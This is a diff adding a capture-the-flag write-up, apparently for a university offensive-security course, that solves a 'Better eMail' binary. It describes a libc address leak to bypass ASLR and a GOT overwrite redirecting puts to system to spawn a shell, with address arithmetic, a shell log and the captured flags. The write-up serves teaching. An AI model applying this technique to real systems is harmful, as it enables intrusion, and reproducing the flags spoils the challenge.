@@ -410,3 +410,70 @@ $ cat flag.txt
     b'flag{phr4ck_v0lum3_S3v3n_1ssu3_F0rty_N1n3!_6dda4308cbf84a08}\n'
 flag{phr4ck_v0lum3_S3v3n_1ssu3_F0rty_N1n3!_6dda4308cbf84a08}
 ```
+
+## Challenge - Better eMail
+```aiignore
+I got rid of several functions. That should stop people from hacking me!
+
+nc offsec-chalbroker.osiris.cyber.nyu.edu 1296
+```
+Inspecting better_email:
+```aiignore
+$ pwn checksec --file=better_email
+[*] '/mnt/csgy9223_IntroOffSec/week_6/better_email'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+We are also given a libc.so.6 file, so I'm guessing we will need to pull some symbol data from it
+
+Running the binary:
+```aiignore
+$ ./better_email
+        Welcome to my Improved eMail Service!
+
+        From: me
+
+        To: you
+        Message: big message
+Segmentation fault
+```
+Segmentation fault. Is this a clue that something needs to be a valid address? Going to binja. I'll create a simple solver to follow the logic and see where the segmentation fault gets thrown.
+
+First thing I notice is that the from_buf is treated like an address and the contents of the address are written back to the terminal.
+
+I put in the address of puts and got back the address stored in the PLT. So now I can break aslr with this information. Since system is not in the PLT, I'll have to derive the address using the information from puts.
+
+```aiignore
+base_address = puts_address - puts_glib_offset
+system_address = base_address + glibc_elf.symbols.system
+```
+
+Looks like the response for "To: ", are 2 addresses. The address of system and the address of puts in the PLT. My computation for the address of system must be off since I keep getting a segmentation fault during the "mov [rax], rdx"
+
+So Instead of using the addresses from the PLT, I used the addresses from the GOT for puts (to compute the base pointer) and the GOT for puts to set the address for system. Sending these 2 values in the "To: " (system address followed by the puts GOT address), response sets the address of system for puts in the GOT.
+
+Finally, I would send in "/bin/sh" for the message which will be passed to the puts PLT (now pointing to system address).
+
+
+```aiignore
+$ ls
+[DEBUG] Sent 0x3 bytes:
+    b'ls\n'
+[DEBUG] Received 0x16 bytes:
+    b'better_email\n'
+    b'flag.txt\n'
+better_email
+flag.txt
+$ cat flag.txt
+[DEBUG] Sent 0xd bytes:
+    b'cat flag.txt\n'
+[DEBUG] Received 0x37 bytes:
+    b'flag{gl1bC_l34k_plus_G0T_0v3rwr1t3!!_ce2ebb3fc33d175b}\n'
+flag{gl1bC_l34k_plus_G0T_0v3rwr1t3!!_ce2ebb3fc33d175b}
+```
